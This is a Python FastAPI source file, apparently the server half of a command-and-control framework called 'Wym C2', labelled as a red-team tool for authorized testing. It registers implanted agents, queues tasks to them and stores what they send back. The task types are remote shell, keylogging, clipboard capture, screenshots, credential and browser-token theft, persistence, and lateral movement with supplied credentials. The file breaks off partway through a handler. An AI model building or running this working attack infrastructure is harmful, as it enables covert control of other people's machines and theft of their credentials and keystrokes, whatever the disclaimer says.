"""Wym C2 — FastAPI server (dashboard + agent API).

Dual-use red-team tool. For authorized penetration testing and security
research ONLY. You must own the systems you connect agents to, or have
explicit written permission from the owner.

Run:
    cd server
    python main.py
    # or: uvicorn main:app --host 0.0.0.0 --port 8000
"""
import asyncio
import copy
import hashlib
import io
import json
import logging
import tarfile
import os
import platform
import re
import secrets
import shutil
import stat
import subprocess
import sys
import threading
import time
import uuid
import urllib.parse

try:
    import winpty as _winpty
    HAS_WINPTY = True
except ImportError:
    HAS_WINPTY = False
    _winpty = None
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

import psutil
import uvicorn
from fastapi import (
    Depends,
    FastAPI,
    File,
    Form,
    Header,
    HTTPException,
    Request,
    UploadFile,
    WebSocket,
    WebSocketDisconnect,
)
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse, PlainTextResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from starlette.middleware.base import BaseHTTPMiddleware
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel

import auth
from database import get_conn, init_db, utcnow
from database import create_token, get_tokens, get_token, update_token_last_used, delete_token

BASE_DIR = Path(__file__).resolve().parent
PROJECT_DIR = BASE_DIR.parent
CLIENTS_DIR = PROJECT_DIR / "clients"

# Per-platform runtime state: a project folder shared between Windows and
# Unix/WSL keeps its own artifacts — Windows uses bare names, Unix/WSL a
# "_wsl" suffix — so they never collide:
#   Windows : c2.db, .agent_token, .server.pid, .server.port, server.log
#                                                              (install.ps1, 8000)
#   Unix    : c2_wsl.db, .agent_token_wsl, .server.pid_wsl, .server.port_wsl,
#             server_wsl.log                                   (install.sh, 8001)
# (venv: .venv vs .venv-wsl. builds/, shared/ and collected/ hold unique
# (per-target/per-task) names, so they stay shared across platforms.)
IS_WIN = sys.platform == "win32"
OS_SUFFIX = "" if IS_WIN else "_wsl"

SHARED_DIR = BASE_DIR / "shared"        # files staged to push to agents
COLLECTED_DIR = BASE_DIR / "collected"  # files pulled from agents
BUILDS_DIR = BASE_DIR / "builds"        # compiled agent binaries
# Everything the cross-compiler touches lives under builds/: scratch space,
# the shared rust target cache and the per-job build logs (error/fix tracking).
BUILD_WORK_DIR = BUILDS_DIR / "_build_tmp"     # scratch for gcc/dotnet/javac/go
BUILD_CARGO_TARGET = BUILDS_DIR / "_cargo_target"  # shared rust incremental cache
BUILD_LOG_DIR = BUILDS_DIR / "logs"            # persisted build logs + history
BUILD_HISTORY_FILE = BUILD_LOG_DIR / "history.json"

log = logging.getLogger("c2")

STALE_AFTER = int(os.environ.get("C2_STALE_AFTER", "90"))
DEAD_AFTER = int(os.environ.get("C2_DEAD_AFTER", "600"))

# 'sent' tasks (delivered to the agent) that were never reported within this
# window are re-queued as 'pending' on the agent's next checkin. Covers the
# case where the agent died mid-task and came back.
RETRY_AFTER = int(os.environ.get("C2_RETRY_AFTER", "180"))

# Upload size cap (MB) applied to dashboard/shared/collected/explorer uploads
MAX_UPLOAD_MB = int(os.environ.get("C2_MAX_UPLOAD_MB", "512"))
MAX_UPLOAD = MAX_UPLOAD_MB * 1024 * 1024

# Set C2_TLS=1 when the app is served over HTTPS (reverse proxy or uvicorn
# --ssl-*). Marks session cookies Secure so they are never sent over HTTP.
TLS_ENABLED = os.environ.get("C2_TLS", "").lower() in ("1", "true", "yes", "on")


def _copy_limited(src, dst, limit: int = MAX_UPLOAD) -> int:
    """Copy a file stream, aborting with 413 if it exceeds the size limit."""
    total = 0
    while True:
        chunk = src.read(1024 * 1024)
        if not chunk:
            break
        total += len(chunk)
        if total > limit:
            raise HTTPException(
                status_code=413, detail=f"file exceeds {MAX_UPLOAD_MB} MB limit"
            )
        dst.write(chunk)
    return total


# ── Explorer sandbox ──────────────────────────────────────────────────
# The web file browser/editor starts at the current working directory
# (the directory the server runs from) by default. Operators can pin a
# different base with C2_EXPLORER_ROOT or restore the project-only
# sandbox with C2_EXPLORER_UNRESTRICTED=0.
_exp_default_root = str(BASE_DIR)
EXPLORER_ROOT = Path(os.environ.get("C2_EXPLORER_ROOT", _exp_default_root)).resolve()
EXPLORER_UNRESTRICTED = os.environ.get("C2_EXPLORER_UNRESTRICTED", "1").lower() in (
    "1", "true", "yes",
)


def _exp_blocked(target: Path) -> bool:
    """Paths inside the sandbox root the explorer must never expose.

    Unrestricted mode (default) exposes every file on the host. When the
    operator opts back into the sandbox with C2_EXPLORER_UNRESTRICTED=0 the
    explorer hides the server's own secrets (agent token, sqlite db) and web
    assets (editing static/ would be a persistent XSS vector for every
    operator).
    """
    if EXPLORER_UNRESTRICTED:
        return False
    if target.name in (".agent_token", ".agent_token_wsl", "c2.db", "c2_wsl.db"):
        return True
    blocked_roots = (BASE_DIR / "static", PROJECT_DIR / ".git")
    return any(target == b or b in target.parents for b in blocked_roots)


def _exp_path(path: str | Path) -> Path:
    """Resolve a path and enforce the explorer sandbox root."""
    target = Path(path).resolve()
    if not EXPLORER_UNRESTRICTED and not (
        target == EXPLORER_ROOT or EXPLORER_ROOT in target.parents
    ):
        raise HTTPException(status_code=403, detail="path outside explorer root")
    if _exp_blocked(target):
        raise HTTPException(status_code=403, detail="path is protected")
    return target


def _exp_default(path: str) -> Path:
    """Like _exp_path but defaults to the sandbox root when empty."""
    return _exp_path(path if path else str(EXPLORER_ROOT))


for _d in (SHARED_DIR, COLLECTED_DIR, BUILDS_DIR, BUILD_LOG_DIR):
    _d.mkdir(exist_ok=True)

ALLOWED_TASK_TYPES = {"shell", "download", "upload", "sleep", "exit", "keylog", "clipboard", "screenshot", "steal", "clone", "persistence", "lateral"}

STEAL_PROFILES = {"all", "env", "tokens", "browser"}


def _steal_profile(raw: str) -> str:
    """Normalize a steal profile argument; unknown values fall back to 'all'."""
    p = (raw or "").strip().lower()
    return p if p in STEAL_PROFILES else "all"


def _lateral_subnet(raw: str) -> str:
    """Extract the subnet portion of a lateral payload.

    Accepts a CIDR/host ("192.168.1.0/24") or an inline "user:pass@CIDR"
    shorthand used by the batch form; returns just the subnet string.
    """
    s = (raw or "").strip()
    if "@" in s:
        s = s.rsplit("@", 1)[-1]
    return s


def _lateral_args(payload: str, user: str, password: str) -> dict:
    """Build lateral task args from the agent form.

    payload    = subnet (CIDR) or "user:pass@subnet" shorthand
    destination= user (optional, overrides shorthand user)
    command    = password (optional, overrides shorthand pass)
    """
    args: dict = {}
    payload = (payload or "").strip()
    if "@" in payload:
        cred, subnet = payload.rsplit("@", 1)
        if ":" in cred:
            u, p = cred.split(":", 1)
            args.setdefault("user", u.strip())
            args.setdefault("pass", p.strip())
        payload = subnet
    if payload:
        args["subnet"] = payload.strip()
    if user:
        args["user"] = user.strip()
    if password:
        args["pass"] = password.strip()
    return args


# --------------------------------------------------------------------------
# Rate limiting for login (simple in-memory per-IP tracker)
# --------------------------------------------------------------------------

class _RateLimiter:
    """Simple sliding-window rate limiter. Tracks failed attempts per IP."""

    def __init__(self, max_attempts: int = 5, window: int = 300):
        self._max = max_attempts
        self._window = window
        self._attempts: dict[str, list[float]] = {}

    def is_limited(self, ip: str) -> bool:
        now = time.time()
        attempts = self._attempts.get(ip, [])
        attempts = [t for t in attempts if now - t < self._window]
        self._attempts[ip] = attempts
        return len(attempts) >= self._max

    def record_failure(self, ip: str) -> None:
        self._attempts.setdefault(ip, []).append(time.time())

    def reset(self, ip: str) -> None:
        self._attempts.pop(ip, None)


_login_limiter = _RateLimiter()


@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()

    # --- clean up expired sessions on startup ---
    cleaned = auth.cleanup_expired_sessions()
    if cleaned:
        print(f"[*] cleaned up {cleaned} expired session(s)")

    # --- shared secret used by agents (persisted across restarts) ---
    env_token = os.environ.get("C2_AGENT_TOKEN", "").strip()
    token_file = BASE_DIR / f".agent_token{OS_SUFFIX}"
    if env_token:
        app.state.agent_token = env_token
    elif token_file.exists():
        app.state.agent_token = token_file.read_text(encoding="utf-8").strip()
    else:
        app.state.agent_token = secrets.token_urlsafe(32)
        token_file.write_text(app.state.agent_token, encoding="utf-8")
        print(f"[*] generated agent token -> {token_file}")
        print(f"    X-Agent-Token: {app.state.agent_token}")

    # --- dashboard bootstrap credentials ---
    username = os.environ.get("C2_USER", "")
    password = os.environ.get("C2_PASSWORD", "")
    if not username:
        username = "admin"
        print("[!] C2_USER not set, defaulting to 'admin'")
    # Pass the configured password through unchanged: sync_default_user() keeps
    # an existing user's password when the argument is empty (fresh installs
    # still get a random password printed here), so a plain restart never
    # silently rotates a dashboard credential that was already set up.
    created, effective = auth.sync_default_user(username, password)
    if created:
        print("[!] dashboard user ready")
        print(f"    url:      http://<server>:8000/login")
        print(f"    username: {username}")
        print(f"    password: {effective}")

    # --- detect the known-weak default credential ---
    if auth.authenticate(username, "admin"):
        print("[!] WARNING: dashboard password is still the default 'admin'")
        print("    change it at /users#change")

    # --- warn about running without TLS ---
    print("[!] WARNING: running without TLS — all traffic is plaintext")
    print("    Use a reverse proxy (Caddy/nginx) or --ssl-keyfile/--ssl-certfile")
    print("    for production deployments.")
    yield


app = FastAPI(
    title="Wym C2",
    description="Wym C2 are What you missed is Command and Control Frameworks",
    version="1.0",
    lifespan=lifespan,
    docs_url="/api/docs" if os.environ.get("C2_API_DOCS") == "1" else None,
    openapi_url="/api/openapi.json" if os.environ.get("C2_API_DOCS") == "1" else None,
    redoc_url=None,
)
app.mount("/static", StaticFiles(directory=BASE_DIR / "static"), name="static")
templates = Jinja2Templates(directory=BASE_DIR / "templates")


# Automatically inject csrf_token into every template render
_orig_render = templates.TemplateResponse

def _patched_render(request, name, context=None, *a, **kw):
    session_token = request.cookies.get(auth.COOKIE_NAME, "")
    csrf = auth.generate_csrf_token(session_token) if session_token else ""
    ctx = dict(context or {})
    ctx.setdefault("csrf_token", csrf)
    return _orig_render(request, name, ctx, *a, **kw)

templates.TemplateResponse = _patched_render


# --------------------------------------------------------------------------
# Security headers middleware
# --------------------------------------------------------------------------

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        if response.headers.get("content-type", "").startswith("text/html"):
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
        # CSP: allow CDN libraries (xterm.js, DevExtreme, Tailwind, jQuery, Google Fonts)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://cdn.tailwindcss.com; "
            "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://fonts.googleapis.com; "
            "img-src 'self' data: https://cdn.jsdelivr.net; "
            "font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; "
            "connect-src 'self' ws://127.0.0.1:* ws://localhost:* https://cdn.jsdelivr.net; "
            "worker-src 'self' blob:;"
        )
        return response


app.add_middleware(SecurityHeadersMiddleware)


# --------------------------------------------------------------------------
# CSRF middleware — validates token on state-changing form submissions
# --------------------------------------------------------------------------

class CSRFMiddleware(BaseHTTPMiddleware):
    # agent-only API endpoints authenticated via X-Agent-Token header — exempt
    _EXEMPT = frozenset({"/api/register", "/api/checkin", "/api/result"})

    async def dispatch(self, request: Request, call_next):
        if request.method in ("POST", "PUT", "DELETE", "PATCH"):
            path = request.url.path
            is_agent_api = path in self._EXEMPT or path.startswith("/api/files/")
            is_login = path == "/login"
            is_ws = path.startswith("/ws/")
            if not is_agent_api and not is_login and not is_ws:
                session_token = request.cookies.get(auth.COOKIE_NAME, "")
                csrf_form = ""
                try:
                    ct = request.headers.get("content-type", "")
                    if "application/x-www-form-urlencoded" in ct:
                        body = await request.body()
                        parsed = urllib.parse.parse_qs(body.decode("utf-8", errors="ignore"))
                        csrf_form = parsed.get("csrf_token", [""])[0]
                    elif "multipart/form-data" in ct:
                        body = await request.body()
                        marker = b'name="csrf_token"'
                        idx = body.find(marker)
                        if idx != -1:
                            head = body.find(b"\r\n\r\n", idx)
                            tail = body.find(b"\r\n--", head + 4) if head != -1 else -1
                            if head != -1 and tail != -1:
                                csrf_form = body[head + 4:tail].decode("utf-8", errors="ignore")
                except Exception:
                    pass
                csrf_header = request.headers.get("x-csrf-token", "")
                csrf_val = csrf_form or csrf_header
                if not session_token or not auth.verify_csrf_token(session_token, csrf_val):
                    from starlette.responses import JSONResponse
                    return JSONResponse({"detail": "invalid CSRF token"}, status_code=403)
        return await call_next(request)


app.add_middleware(CSRFMiddleware)


# --------------------------------------------------------------------------
# Helpers / dependencies
# --------------------------------------------------------------------------

def get_current_user(request: Request) -> Optional[str]:
    token = request.cookies.get(auth.COOKIE_NAME)
    return auth.get_session_user(token) if token else None


def login_redirect() -> RedirectResponse:
    return RedirectResponse("/login", status_code=303)


def require_agent_token(x_agent_token: str = Header(default="")) -> None:
    expected = app.state.agent_token
    if not expected or not secrets.compare_digest(x_agent_token, expected):
        raise HTTPException(status_code=401, detail="invalid agent token")


def agent_status(agent) -> str:
    try:
        exited = agent["exited_at"]
    except (KeyError, IndexError, TypeError):
        exited = None
    if exited:
        return "dead"
    try:
        last = datetime.strptime(agent["last_seen"], "%Y-%m-%d %H:%M:%S")
        age = (datetime.now(timezone.utc).replace(tzinfo=None) - last).total_seconds()
    except (ValueError, TypeError):
        return "unknown"
    if age < STALE_AFTER:
        return "alive"
    if age < DEAD_AFTER:
        return "stale"
    return "dead"


# --------------------------------------------------------------------------
# Pydantic models (agent-facing API)
# --------------------------------------------------------------------------

class RegisterBody(BaseModel):
    agent_id: Optional[str] = None
    hostname: str = "unknown"
    username: str = ""
    os: str = ""
    arch: str = ""
    pid: int = 0
    ip: str = ""
    version: str = "1.0"
    type: str = ""


class CheckinBody(BaseModel):
    agent_id: str


class ResultBody(BaseModel):
    agent_id: str
    task_id: str
    output: str = ""
    exit_code: int = 0
    error: str = ""


# --------------------------------------------------------------------------
# Agent-facing API
# --------------------------------------------------------------------------

@app.post("/api/register")
async def api_register(body: RegisterBody, _: None = Depends(require_agent_token)):
    now = utcnow()
    conn = get_conn()
    try:
        if body.agent_id:
            row = conn.execute(
                "SELECT id FROM agents WHERE id = ?", (body.agent_id,)
            ).fetchone()
            if row is not None:
                conn.execute(
                    "UPDATE agents SET hostname=?, username=?, os=?, arch=?, pid=?, ip=?, version=?, type=?, last_seen=?, exited_at=NULL "
                    "WHERE id=?",
                    (body.hostname, body.username, body.os, body.arch,
                     body.pid, body.ip or "unknown", body.version or "1.0", body.type or "", now, body.agent_id),
                )
                conn.commit()
                log.info("agent re-registered: %s (%s)", body.agent_id, body.hostname)
                return {"agent_id": body.agent_id, "status": "known"}

        agent_id = uuid.uuid4().hex
        conn.execute(
            "INSERT INTO agents (id, hostname, username, os, arch, pid, ip, version, type, first_seen, last_seen) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?)",
            (agent_id, body.hostname, body.username, body.os, body.arch,
             body.pid, body.ip or "unknown", body.version or "1.0", body.type or "", now, now),
        )
        conn.commit()
        log.info("agent registered: %s (%s@%s)", agent_id, body.username, body.hostname)
        return {"agent_id": agent_id, "status": "registered"}
    finally:
        conn.close()


@app.post("/api/checkin")
async def api_checkin(body: CheckinBody, _: None = Depends(require_agent_token)):
    conn = get_conn()
    try:
        row = conn.execute("SELECT id FROM agents WHERE id = ?", (body.agent_id,)).fetchone()
        if row is None:
            return JSONResponse(status_code=404, content={"error": "unknown agent"})

        conn.execute("UPDATE agents SET last_seen = ?, exited_at = NULL WHERE id = ?", (utcnow(), body.agent_id))

        # Re-queue tasks delivered but never reported (agent died mid-task).
        retry_before = (
            datetime.now(timezone.utc).replace(tzinfo=None)
            - timedelta(seconds=RETRY_AFTER)
        ).strftime("%Y-%m-%d %H:%M:%S")
        conn.execute(
            "UPDATE tasks SET status='pending', sent_at=NULL "
            "WHERE agent_id = ? AND status='sent' AND sent_at < ?",
            (body.agent_id, retry_before),
        )

        pending = conn.execute(
            "SELECT id, type, args FROM tasks "
            "WHERE agent_id = ? AND status = 'pending' ORDER BY created_at",
            (body.agent_id,),
        ).fetchall()

        tasks = []
        for t in pending:
            cur = conn.execute(
                "UPDATE tasks SET status='sent', sent_at=? WHERE id=? AND status='pending'",
                (utcnow(), t["id"]),
            )
            if cur.rowcount == 0:  # claimed by a concurrent checkin
                continue
            try:
                args = json.loads(t["args"])
            except json.JSONDecodeError:
                args = {}
            tasks.append({"task_id": t["id"], "type": t["type"], "args": args})
        conn.commit()
        return {"tasks": tasks}
    finally:
        conn.close()


RESULT_SIZE_LIMIT = int(os.environ.get("C2_RESULT_LIMIT", "50000"))  # chars


@app.post("/api/result")
async def api_result(body: ResultBody, _: None = Depends(require_agent_token)):
    status = "completed" if not body.error else "failed"
    # enforce server-side result size limit
    output = body.output or ""
    if len(output) > RESULT_SIZE_LIMIT:
        output = output[:RESULT_SIZE_LIMIT] + f"\n... [truncated at {RESULT_SIZE_LIMIT} chars by server]"
    conn = get_conn()
    try:
        cur = conn.execute(
            "UPDATE tasks SET status=?, result=?, exit_code=?, completed_at=? "
            "WHERE id=? AND agent_id=?",
            (status, output, body.exit_code, utcnow(), body.task_id, body.agent_id),
        )
        conn.commit()
        if cur.rowcount == 0:
            return JSONResponse(status_code=404, content={"error": "task not found"})
        # exit order completed → mark the agent dead so it no longer shows alive
        try:
            trow = conn.execute("SELECT type FROM tasks WHERE id = ?", (body.task_id,)).fetchone()
            if trow and trow["type"] == "exit":
                conn.execute(
                    "UPDATE agents SET exited_at = ? WHERE id = ?",
                    (utcnow(), body.agent_id),
                )
                conn.commit()
        except Exception:
            pass
        return {"ok": True}
    finally:
        conn.close()


@app.get("/api/clone/status/{agent_id}")
async def api_clone_status(agent_id: str, _: None = Depends(require_agent_token)):
    """Status of a target agent, used by clone/watcher agents to decide
    whether to relaunch it. Includes raw last_seen for fine-grained checks."""
    conn = get_conn()
    try:
        row = conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
    finally:
        conn.close()
    if row is None:
        raise HTTPException(status_code=404, detail="agent not found")
    return {
        "agent_id": row["id"],
        "status": agent_status(row),
        "last_seen": row["last_seen"],
        "exited_at": row["exited_at"],
    }


@app.get("/api/files/{task_id}")
async def api_file_download(task_id: str, _: None = Depends(require_agent_token)):
    conn = get_conn()
    try:
        row = conn.execute("SELECT type, args FROM tasks WHERE id = ?", (task_id,)).fetchone()
    finally:
        conn.close()
    if row is None or row["type"] != "download":
        raise HTTPException(status_code=404, detail="task not found")
    try:
        filename = json.loads(row["args"]).get("file", "")
    except json.JSONDecodeError:
        filename = ""
    path = SHARED_DIR / Path(filename).name
    if not path.is_file():
        raise HTTPException(status_code=404, detail="staged file not found")
    return FileResponse(path, filename=Path(filename).name)


@app.post("/api/files/{task_id}")
async def api_file_upload(
    task_id: str, file: UploadFile = File(...), _: None = Depends(require_agent_token)
):
    conn = get_conn()
    try:
        row = conn.execute(
            "SELECT agent_id, type FROM tasks WHERE id = ?", (task_id,)
        ).fetchone()
    finally:
        conn.close()
    if row is None or row["type"] not in ("upload", "screenshot", "steal"):
        raise HTTPException(status_code=404, detail="task not found")
    agent_id = row["agent_id"]
    safe_name = Path(file.filename or "upload.bin").name
    dest = COLLECTED_DIR / f"{agent_id}__{task_id}__{safe_name}"
    with dest.open("wb") as fh:
        _copy_limited(file.file, fh)
    return {"ok": True, "saved": dest.name}


# --------------------------------------------------------------------------
# Dashboard JSON API (cookie-authenticated, used by the front-end)
# --------------------------------------------------------------------------

@app.get("/api/agents")
async def api_agents_list(request: Request):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    conn = get_conn()
    try:
        rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    finally:
        conn.close()
    agents = [{**dict(r), "status": agent_status(r)} for r in rows]
    return {"agents": agents}


@app.get("/api/agents/{agent_id}/tasks")
async def api_agent_tasks(request: Request, agent_id: str):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    conn = get_conn()
    try:
        rows = conn.execute(
            "SELECT * FROM tasks WHERE agent_id = ? ORDER BY created_at DESC LIMIT 300",
            (agent_id,),
        ).fetchall()
    finally:
        conn.close()
    return {"tasks": [dict(r) for r in rows]}


@app.get("/api/metrics")
async def api_metrics(request: Request):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    conn = get_conn()
    try:
        agents = conn.execute("SELECT id, last_seen FROM agents").fetchall()
        now = datetime.now(timezone.utc).replace(tzinfo=None)
        alive = stale = dead = 0
        for a in agents:
            try:
                last = datetime.strptime(a["last_seen"], "%Y-%m-%d %H:%M:%S")
                age = (now - last).total_seconds()
                if age < STALE_AFTER:
                    alive += 1
                elif age < DEAD_AFTER:
                    stale += 1
                else:
                    dead += 1
            except (ValueError, TypeError):
                pass
        total_agents = len(agents)
        total_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks").fetchone()["c"]
        pending = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status='pending'").fetchone()["c"]
        sent = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status='sent'").fetchone()["c"]
        completed = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status='completed'").fetchone()["c"]
        failed = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status='failed'").fetchone()["c"]
    finally:
        conn.close()
    return {
        "agents": {"total": total_agents, "alive": alive, "stale": stale, "dead": dead},
        "tasks": {"total": total_tasks, "pending": pending, "sent": sent, "completed": completed, "failed": failed},
    }


# --------------------------------------------------------------------------
# Token management API
# --------------------------------------------------------------------------

@app.get("/api/tokens")
async def api_tokens_list(request: Request):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    return {"tokens": get_tokens()}


@app.post("/api/tokens")
async def api_tokens_create(request: Request):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if not auth.is_admin(user):
        raise HTTPException(status_code=403, detail="admin role required")
    body = await request.json()
    name = body.get("name", "").strip()
    server_url = body.get("server_url", "").strip()
    if not name:
        raise HTTPException(status_code=400, detail="name is required")
    token_val = secrets.token_urlsafe(32)
    rec = create_token(name=name, token=token_val, server_url=server_url)
    return rec


@app.delete("/api/tokens/{token_val}")
async def api_tokens_delete(request: Request, token_val: str):
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if not auth.is_admin(user):
        raise HTTPException(status_code=403, detail="admin role required")
    ok = delete_token(token_val)
    if not ok:
        raise HTTPException(status_code=404, detail="token not found")
    return {"ok": True}


# --------------------------------------------------------------------------
# Dashboard pages
# --------------------------------------------------------------------------

@app.get("/", include_in_schema=False)
async def index(request: Request):
    return RedirectResponse("/dashboard" if get_current_user(request) else "/login", status_code=303)


@app.get("/login", include_in_schema=False)
async def login_page(request: Request):
    if get_current_user(request):
        return RedirectResponse("/dashboard", status_code=303)
    return templates.TemplateResponse(request, "login.html", {"error": None})


@app.post("/login", include_in_schema=False)
async def login_post(request: Request, username: str = Form(...), password: str = Form(...)):
    client_ip = request.client.host if request.client else "unknown"
    if _login_limiter.is_limited(client_ip):
        return templates.TemplateResponse(
            request, "login.html",
            {"error": "Too many failed attempts. Try again in 5 minutes."},
            status_code=429,
        )
    if auth.authenticate(username, password):
        _login_limiter.reset(client_ip)
        auth.touch_user(username)
        resp = RedirectResponse("/dashboard", status_code=303)
        resp.set_cookie(
            auth.COOKIE_NAME,
            auth.create_session(username),
            httponly=True,
            samesite="lax",
            secure=TLS_ENABLED,
            max_age=auth.SESSION_TTL,
        )
        return resp
    _login_limiter.record_failure(client_ip)
    return templates.TemplateResponse(
        request, "login.html", {"error": "Invalid username or password"}, status_code=401
    )


@app.get("/logout", include_in_schema=False)
async def logout(request: Request):
    token = request.cookies.get(auth.COOKIE_NAME)
    if token:
        auth.destroy_session(token)
    resp = RedirectResponse("/login", status_code=303)
    resp.delete_cookie(auth.COOKIE_NAME)
    return resp


@app.get("/account", include_in_schema=False)
async def account_page(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    if auth.is_admin(user):
        return RedirectResponse("/users#change", status_code=303)
    return templates.TemplateResponse(request, "account.html", {"user": user})


@app.post("/account", include_in_schema=False)
async def account_post(
    request: Request,
    current_password: str = Form(...),
    new_password: str = Form(...),
    confirm_password: str = Form(""),
):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    if not auth.authenticate(user, current_password):
        return RedirectResponse("/users?err=" + urllib.parse.quote("Current password is incorrect") + "#change", status_code=303)
    if new_password != confirm_password:
        return RedirectResponse("/users?err=" + urllib.parse.quote("New passwords do not match") + "#change", status_code=303)
    if len(new_password) < 8:
        return RedirectResponse("/users?err=" + urllib.parse.quote("Password must be at least 8 characters") + "#change", status_code=303)
    auth.change_password(user, new_password, keep_token=request.cookies.get(auth.COOKIE_NAME, ""))
    return RedirectResponse("/users?ok=" + urllib.parse.quote("Password changed successfully") + "#change", status_code=303)


@app.get("/dashboard", include_in_schema=False)
async def dashboard(request: Request):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    return templates.TemplateResponse(request, "dashboard.html", {"user": user})


@app.get("/agents/{agent_id}", include_in_schema=False)
async def agent_page(request: Request, agent_id: str, task: str = ""):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    conn = get_conn()
    try:
        agent = conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
    finally:
        conn.close()
    if agent is None:
        raise HTTPException(status_code=404, detail="agent not found")
    agent = dict(agent)
    files = sorted(p.name for p in COLLECTED_DIR.glob(f"{agent_id}__*"))
    return templates.TemplateResponse(
        request,
        "agent.html",
        {"user": user, "agent": agent, "status": agent_status(agent),
         "files": files, "selected_type": task or "shell"},
    )


@app.post("/agents/{agent_id}/tasks", include_in_schema=False)
async def create_task(
    request: Request,
    agent_id: str,
    task_type: str = Form(...),
    payload: str = Form(""),
    timeout: str = Form(""),
    destination: str = Form(""),
    command: str = Form(""),
):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    if task_type not in ALLOWED_TASK_TYPES:
        raise HTTPException(status_code=400, detail=f"invalid task type: {task_type}")

    if task_type == "shell":
        args = {"command": payload}
        try:
            t = int(timeout)
            if t >= 1:
                args["timeout"] = min(t, 3600)  # hard cap at 1h
        except ValueError:
            pass
    elif task_type == "download":
        args = {"file": Path(payload).name if payload else "payload.bin"}
        if destination.strip():
            args["destination"] = destination.strip()
    elif task_type == "upload":
        args = {"path": payload}
    elif task_type == "sleep":
        try:
            args = {"seconds": max(1, int(payload))}
        except ValueError:
            args = {"seconds": 10}
    elif task_type == "keylog":
        action = (payload or "dump").strip().lower()
        if action not in ("start", "stop", "dump"):
            action = "dump"
        args = {"action": action}
    elif task_type == "clipboard":
        action = (payload or "get").strip().lower()
        if action not in ("get", "set"):
            action = "get"
        args = {"action": action}
        if action == "set" and destination.strip():
            args["text"] = destination.strip()
    elif task_type == "screenshot":
        name = (payload or "").strip()
        args = {"name": name} if name else {}
    elif task_type == "steal":
        args = {"profile": _steal_profile(payload)}
    elif task_type == "clone":
        action = (payload or "start").strip().lower()
        if action not in ("start", "stop", "status"):
            action = "start"
        args = {"action": action, "command": command.strip()}
        target = destination.strip()
        if target:
            args["target"] = target
        if action in ("start", "status") and timeout.strip():
            try:
                args["interval"] = max(5, min(int(timeout), 3600))
            except ValueError:
                pass
    elif task_type == "persistence":
        args = {}
    elif task_type == "lateral":
        args = _lateral_args(payload, destination.strip(), command.strip())
    else:  # exit
        args = {}

    task_id = uuid.uuid4().hex
    conn = get_conn()
    try:
        row = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
        if row is None:
            raise HTTPException(status_code=404, detail="agent not found")
        conn.execute(
            "INSERT INTO tasks (id, agent_id, type, args, created_at) VALUES (?,?,?,?,?)",
            (task_id, agent_id, task_type, json.dumps(args), utcnow()),
        )
        conn.commit()
        log.info("task queued: %s -> %s (%s)", agent_id[:8], task_type, task_id[:8])
    finally:
        conn.close()
    return RedirectResponse(f"/agents/{agent_id}?task={task_type}", status_code=303)


@app.post("/tasks/{task_id}/cancel", include_in_schema=False)
async def cancel_task(request: Request, task_id: str):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    conn = get_conn()
    try:
        row = conn.execute("SELECT agent_id FROM tasks WHERE id = ?", (task_id,)).fetchone()
        if row is not None:
            conn.execute(
                "UPDATE tasks SET status='cancelled' WHERE id=? AND status='pending'", (task_id,)
            )
            conn.commit()
    finally:
        conn.close()
    if row is None:
        raise HTTPException(status_code=404, detail="task not found")
    return RedirectResponse(f"/agents/{row['agent_id']}", status_code=303)


@app.post("/agents/{agent_id}/delete", include_in_schema=False)
async def delete_agent(request: Request, agent_id: str):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    conn = get_conn()
    try:
        conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        conn.commit()
    finally:
        conn.close()
    # cleanup collected files for this agent
    for f in COLLECTED_DIR.glob(f"{agent_id}__*"):
        try:
            f.unlink()
        except OSError:
            pass
    return RedirectResponse("/dashboard", status_code=303)


@app.post("/agents/{agent_id}/note", include_in_schema=False)
async def set_agent_note(request: Request, agent_id: str, note: str = Form("")):
    user = get_current_user(request)
    if not user:
        return login_redirect()
    conn = get_conn()
    try:
        conn.execute(
